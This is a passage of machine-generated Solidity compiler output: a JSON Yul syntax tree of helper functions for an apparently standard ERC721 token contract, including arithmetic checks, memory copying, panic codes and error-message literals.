Type":"YulIdentifier","src":"19690:2:15"},"nodeType":"YulFunctionCall","src":"19690:8:15"},"nodeType":"YulIf","src":"19687:34:15"},{"nodeType":"YulAssignment","src":"19731:17:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19743:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"19746:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"19739:3:15"},"nodeType":"YulFunctionCall","src":"19739:9:15"},"variableNames":[{"name":"diff","nodeType":"YulIdentifier","src":"19731:4:15"}]}]},"name":"checked_sub_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"19594:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"19597:1:15","type":""}],"returnVariables":[{"name":"diff","nodeType":"YulTypedName","src":"19603:4:15","type":""}],"src":"19563:191:15"},{"body":{"nodeType":"YulBlock","src":"19805:51:15","statements":[{"nodeType":"YulAssignment","src":"19815:35:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"19844:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"19826:17:15"},"nodeType":"YulFunctionCall","src":"19826:24:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"19815:7:15"}]}]},"name":"cleanup_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"19787:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"19797:7:15","type":""}],"src":"19760:96:15"},{"body":{"nodeType":"YulBlock","src":"19904:48:15","statements":[{"nodeType":"YulAssignment","src":"19914:32:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"19939:5:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"19932:6:15"},"nodeType":"YulFunctionCall","src":"19932:13:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"19925:6:15"},"nodeType":"YulFunctionCall","src":"19925:21:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"19914:7:15"}]}]},"name":"cleanup_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"19886:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"19896:7:15","type":""}],"src":"19862:90:15"},{"body":{"nodeType":"YulBlock","src":"20002:105:15","statements":[{"nodeType":"YulAssignment","src":"20012:89:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"20027:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"20034:66:15","type":"","value":"0xffffffff00000000000000000000000000000000000000000000000000000000"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20023:3:15"},"nodeType":"YulFunctionCall","src":"20023:78:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"20012:7:15"}]}]},"name":"cleanup_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"19984:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"19994:7:15","type":""}],"src":"19958:149:15"},{"body":{"nodeType":"YulBlock","src":"20158:81:15","statements":[{"nodeType":"YulAssignment","src":"20168:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"20183:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"20190:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20179:3:15"},"nodeType":"YulFunctionCall","src":"20179:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"20168:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"20140:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"20150:7:15","type":""}],"src":"20113:126:15"},{"body":{"nodeType":"YulBlock","src":"20290:32:15","statements":[{"nodeType":"YulAssignment","src":"20300:16:15","value":{"name":"value","nodeType":"YulIdentifier","src":"20311:5:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"20300:7:15"}]}]},"name":"cleanup_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"20272:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"20282:7:15","type":""}],"src":"20245:77:15"},{"body":{"nodeType":"YulBlock","src":"20379:103:15","statements":[{"expression":{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20402:3:15"},{"name":"src","nodeType":"YulIdentifier","src":"20407:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"20412:6:15"}],"functionName":{"name":"calldatacopy","nodeType":"YulIdentifier","src":"20389:12:15"},"nodeType":"YulFunctionCall","src":"20389:30:15"},"nodeType":"YulExpressionStatement","src":"20389:30:15"},{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20460:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"20465:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20456:3:15"},"nodeType":"YulFunctionCall","src":"20456:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"20474:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20449:6:15"},"nodeType":"YulFunctionCall","src":"20449:27:15"},"nodeType":"YulExpressionStatement","src":"20449:27:15"}]},"name":"copy_calldata_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"20361:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"20366:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"20371:6:15","type":""}],"src":"20328:154:15"},{"body":{"nodeType":"YulBlock","src":"20537:258:15","statements":[{"nodeType":"YulVariableDeclaration","src":"20547:10:15","value":{"kind":"number","nodeType":"YulLiteral","src":"20556:1:15","type":"","value":"0"},"variables":[{"name":"i","nodeType":"YulTypedName","src":"20551:1:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"20616:63:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20641:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"20646:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20637:3:15"},"nodeType":"YulFunctionCall","src":"20637:11:15"},{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"20660:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"20665:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20656:3:15"},"nodeType":"YulFunctionCall","src":"20656:11:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"20650:5:15"},"nodeType":"YulFunctionCall","src":"20650:18:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20630:6:15"},"nodeType":"YulFunctionCall","src":"20630:39:15"},"nodeType":"YulExpressionStatement","src":"20630:39:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"20577:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"20580:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"20574:2:15"},"nodeType":"YulFunctionCall","src":"20574:13:15"},"nodeType":"YulForLoop","post":{"nodeType":"YulBlock","src":"20588:19:15","statements":[{"nodeType":"YulAssignment","src":"20590:15:15","value":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"20599:1:15"},{"kind":"number","nodeType":"YulLiteral","src":"20602:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20595:3:15"},"nodeType":"YulFunctionCall","src":"20595:10:15"},"variableNames":[{"name":"i","nodeType":"YulIdentifier","src":"20590:1:15"}]}]},"pre":{"nodeType":"YulBlock","src":"20570:3:15","statements":[]},"src":"20566:113:15"},{"body":{"nodeType":"YulBlock","src":"20713:76:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20763:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"20768:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20759:3:15"},"nodeType":"YulFunctionCall","src":"20759:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"20777:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20752:6:15"},"nodeType":"YulFunctionCall","src":"20752:27:15"},"nodeType":"YulExpressionStatement","src":"20752:27:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"20694:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"20697:6:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"20691:2:15"},"nodeType":"YulFunctionCall","src":"20691:13:15"},"nodeType":"YulIf","src":"20688:101:15"}]},"name":"copy_memory_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"20519:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"20524:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"20529:6:15","type":""}],"src":"20488:307:15"},{"body":{"nodeType":"YulBlock","src":"20852:269:15","statements":[{"nodeType":"YulAssignment","src":"20862:22:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"20876:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"20882:1:15","type":"","value":"2"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"20872:3:15"},"nodeType":"YulFunctionCall","src":"20872:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"20862:6:15"}]},{"nodeType":"YulVariableDeclaration","src":"20893:38:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"20923:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"20929:1:15","type":"","value":"1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20919:3:15"},"nodeType":"YulFunctionCall","src":"20919:12:15"},"variables":[{"name":"outOfPlaceEncoding","nodeType":"YulTypedName","src":"20897:18:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"20970:51:15","statements":[{"nodeType":"YulAssignment","src":"20984:27:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"20998:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21006:4:15","type":"","value":"0x7f"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20994:3:15"},"nodeType":"YulFunctionCall","src":"20994:17:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"20984:6:15"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"20950:18:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"20943:6:15"},"nodeType":"YulFunctionCall","src":"20943:26:15"},"nodeType":"YulIf","src":"20940:81:15"},{"body":{"nodeType":"YulBlock","src":"21073:42:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nodeType":"YulIdentifier","src":"21087:16:15"},"nodeType":"YulFunctionCall","src":"21087:18:15"},"nodeType":"YulExpressionStatement","src":"21087:18:15"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"21037:18:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"21060:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21068:2:15","type":"","value":"32"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"21057:2:15"},"nodeType":"YulFunctionCall","src":"21057:14:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"21034:2:15"},"nodeType":"YulFunctionCall","src":"21034:38:15"},"nodeType":"YulIf","src":"21031:84:15"}]},"name":"extract_byte_array_length","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nodeType":"YulTypedName","src":"20836:4:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"20845:6:15","type":""}],"src":"20801:320:15"},{"body":{"nodeType":"YulBlock","src":"21170:238:15","statements":[{"nodeType":"YulVariableDeclaration","src":"21180:58:15","value":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21202:6:15"},{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"21232:4:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"21210:21:15"},"nodeType":"YulFunctionCall","src":"21210:27:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21198:3:15"},"nodeType":"YulFunctionCall","src":"21198:40:15"},"variables":[{"name":"newFreePtr","nodeType":"YulTypedName","src":"21184:10:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"21349:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"21351:16:15"},"nodeType":"YulFunctionCall","src":"21351:18:15"},"nodeType":"YulExpressionStatement","src":"21351:18:15"}]},"condition":{"arguments":[{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"21292:10:15"},{"kind":"number","nodeType":"YulLiteral","src":"21304:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"21289:2:15"},"nodeType":"YulFunctionCall","src":"21289:34:15"},{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"21328:10:15"},{"name":"memPtr","nodeType":"YulIdentifier","src":"21340:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"21325:2:15"},"nodeType":"YulFunctionCall","src":"21325:22:15"}],"functionName":{"name":"or","nodeType":"YulIdentifier","src":"21286:2:15"},"nodeType":"YulFunctionCall","src":"21286:62:15"},"nodeType":"YulIf","src":"21283:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21387:2:15","type":"","value":"64"},{"name":"newFreePtr","nodeType":"YulIdentifier","src":"21391:10:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21380:6:15"},"nodeType":"YulFunctionCall","src":"21380:22:15"},"nodeType":"YulExpressionStatement","src":"21380:22:15"}]},"name":"finalize_allocation","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"21156:6:15","type":""},{"name":"size","nodeType":"YulTypedName","src":"21164:4:15","type":""}],"src":"21127:281:15"},{"body":{"nodeType":"YulBlock","src":"21442:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21459:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21462:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21452:6:15"},"nodeType":"YulFunctionCall","src":"21452:88:15"},"nodeType":"YulExpressionStatement","src":"21452:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21556:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"21559:4:15","type":"","value":"0x11"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21549:6:15"},"nodeType":"YulFunctionCall","src":"21549:15:15"},"nodeType":"YulExpressionStatement","src":"21549:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21580:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21583:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21573:6:15"},"nodeType":"YulFunctionCall","src":"21573:15:15"},"nodeType":"YulExpressionStatement","src":"21573:15:15"}]},"name":"panic_error_0x11","nodeType":"YulFunctionDefinition","src":"21414:180:15"},{"body":{"nodeType":"YulBlock","src":"21628:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21645:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21648:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21638:6:15"},"nodeType":"YulFunctionCall","src":"21638:88:15"},"nodeType":"YulExpressionStatement","src":"21638:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21742:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"21745:4:15","type":"","value":"0x22"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21735:6:15"},"nodeType":"YulFunctionCall","src":"21735:15:15"},"nodeType":"YulExpressionStatement","src":"21735:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21766:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21769:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21759:6:15"},"nodeType":"YulFunctionCall","src":"21759:15:15"},"nodeType":"YulExpressionStatement","src":"21759:15:15"}]},"name":"panic_error_0x22","nodeType":"YulFunctionDefinition","src":"21600:180:15"},{"body":{"nodeType":"YulBlock","src":"21814:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21831:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21834:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21824:6:15"},"nodeType":"YulFunctionCall","src":"21824:88:15"},"nodeType":"YulExpressionStatement","src":"21824:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21928:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"21931:4:15","type":"","value":"0x41"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21921:6:15"},"nodeType":"YulFunctionCall","src":"21921:15:15"},"nodeType":"YulExpressionStatement","src":"21921:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21952:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21955:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21945:6:15"},"nodeType":"YulFunctionCall","src":"21945:15:15"},"nodeType":"YulExpressionStatement","src":"21945:15:15"}]},"name":"panic_error_0x41","nodeType":"YulFunctionDefinition","src":"21786:180:15"},{"body":{"nodeType":"YulBlock","src":"22061:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22078:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22081:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22071:6:15"},"nodeType":"YulFunctionCall","src":"22071:12:15"},"nodeType":"YulExpressionStatement","src":"22071:12:15"}]},"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulFunctionDefinition","src":"21972:117:15"},{"body":{"nodeType":"YulBlock","src":"22184:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22201:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22204:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22194:6:15"},"nodeType":"YulFunctionCall","src":"22194:12:15"},"nodeType":"YulExpressionStatement","src":"22194:12:15"}]},"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulFunctionDefinition","src":"22095:117:15"},{"body":{"nodeType":"YulBlock","src":"22307:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22324:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22327:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22317:6:15"},"nodeType":"YulFunctionCall","src":"22317:12:15"},"nodeType":"YulExpressionStatement","src":"22317:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"22218:117:15"},{"body":{"nodeType":"YulBlock","src":"22430:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22447:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22450:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22440:6:15"},"nodeType":"YulFunctionCall","src":"22440:12:15"},"nodeType":"YulExpressionStatement","src":"22440:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"22341:117:15"},{"body":{"nodeType":"YulBlock","src":"22512:54:15","statements":[{"nodeType":"YulAssignment","src":"22522:38:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"22540:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"22547:2:15","type":"","value":"31"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22536:3:15"},"nodeType":"YulFunctionCall","src":"22536:14:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22556:2:15","type":"","value":"31"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"22552:3:15"},"nodeType":"YulFunctionCall","src":"22552:7:15"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"22532:3:15"},"nodeType":"YulFunctionCall","src":"22532:28:15"},"variableNames":[{"name":"result","nodeType":"YulIdentifier","src":"22522:6:15"}]}]},"name":"round_up_to_mul_of_32","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"22495:5:15","type":""}],"returnVariables":[{"name":"result","nodeType":"YulTypedName","src":"22505:6:15","type":""}],"src":"22464:102:15"},{"body":{"nodeType":"YulBlock","src":"22678:126:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22700:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22708:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22696:3:15"},"nodeType":"YulFunctionCall","src":"22696:14:15"},{"hexValue":"4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e65","kind":"string","nodeType":"YulLiteral","src":"22712:34:15","type":"","value":"ERC721: caller is not token owne"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22689:6:15"},"nodeType":"YulFunctionCall","src":"22689:58:15"},"nodeType":"YulExpressionStatement","src":"22689:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22768:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22776:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22764:3:15"},"nodeType":"YulFunctionCall","src":"22764:15:15"},{"hexValue":"72206f7220617070726f766564","kind":"string","nodeType":"YulLiteral","src":"22781:15:15","type":"","value":"r or approved"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22757:6:15"},"nodeType":"YulFunctionCall","src":"22757:40:15"},"nodeType":"YulExpressionStatement","src":"22757:40:15"}]},"name":"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22670:6:15","type":""}],"src":"22572:232:15"},{"body":{"nodeType":"YulBlock","src":"22916:131:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22938:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22946:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22934:3:15"},"nodeType":"YulFunctionCall","src":"22934:14:15"},{"hexValue":"4552433732313a207472616e7366657220746f206e6f6e204552433732315265","kind":"string","nodeType":"YulLiteral","src":"22950:34:15","type":"","value":"ERC721: transfer to non ERC721Re"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22927:6:15"},"nodeType":"YulFunctionCall","src":"22927:58:15"},"nodeType":"YulExpressionStatement","src":"22927:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23006:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23014:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23002:3:15"},"nodeType":"YulFunctionCall","src":"23002:15:15"},{"hexValue":"63656976657220696d706c656d656e746572","kind":"string","nodeType":"YulLiteral","src":"23019:20:15","type":"","value":"ceiver implementer"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22995:6:15"},"nodeType":"YulFunctionCall","src":"22995:45:15"},"nodeType":"YulExpressionStatement","src":"22995:45:15"}]},"name":"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22908:6:15","type":""}],"src":"22810:237:15"},{"body":{"nodeType":"YulBlock","src":"23159:118:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23181:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23189:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23177:3:15"},"nodeType":"YulFunctionCall","src":"23177:14:15"},{"hexValue":"4552433732313a207472616e736665722066726f6d20696e636f727265637420","kind":"string","nodeType":"YulLiteral","src":"23193:34:15","type":"","value":"ERC721: transfer from incorrect "}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23170:6:15"},"nodeType":"YulFunctionCall","src":"23170:58:15"},"nodeType":"YulExpressionStatement","src":"23170:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23249:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23257:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23245:3:15"},"nodeType":"YulFunctionCall","src":"23245:15:15"},{"hexValue":"6f776e6572","kind":"string","nodeType":"YulLiteral","src":"23262:7:15","type":"","value":"owner"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23238:6:15"},"nodeType":"YulFunctionCall","src":"23238:32:15"},"nodeType":"YulExpressionStatement","src":"23238:32:15"}]},"name":"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23151:6:15","type":""}],"src":"23053:224:15"},{"body":{"nodeType":"YulBlock","src":"23389:72:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23411:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23419:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23407:3:15"},"nodeType":"YulFunctionCall","src":"23407:14:15"},{"hexValue":"4552433732313a20746f6b656e20616c7265616479206d696e746564","kind":"string","nodeType":"YulLiteral","src":"23423:30:15","type":"","value":"ERC721: token already minted"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23400:6:15"},"nodeType":"YulFunctionCall","src":"23400:54:15"},"nodeType":"YulExpressionStatement","src":"23400:54:15"}]},"name":"store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23381:6:15","type":""}],"src":"23283:178:15"},{"body":{"nodeType":"YulBlock","src":"23573:117:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23595:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23603:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23591:3:15"},"nodeType":"YulFunctionCall","src":"23591:14:15"},{"hexValue":"4552433732313a207472616e7366657220746f20746865207a65726f20616464","kind":"string","nodeType":"YulLiteral","src":"23607:34:15","type":"","value":"ERC721: transfer to the zero add"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23584:6:15"},"nodeType":"YulFunctionCall","src":"23584:58:15"},"nodeType":"YulExpressionStatement","src":"23584:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23663:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23671:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23659:3:15"},"nodeType":"YulFunctionCall","src":"23659:15:15"},{"hexValue":"72657373","kind":"string","nodeType":"YulLiteral","src":"23676:6:15","type":"","value":"ress"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23652:6:15"},"nodeType":"YulFunctionCall","src":"23652:31:15"},"nodeType":"YulExpressionStatement","src":"23652:31:15"}]},"name":"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23565:6:15","type":""}],"src":"23467:223:15"},{"body":{"nodeType":"YulBlock","src":"23802:69:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23824:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23832:1:15","type":"","value":"0"}],"functionName":{"name":"add","no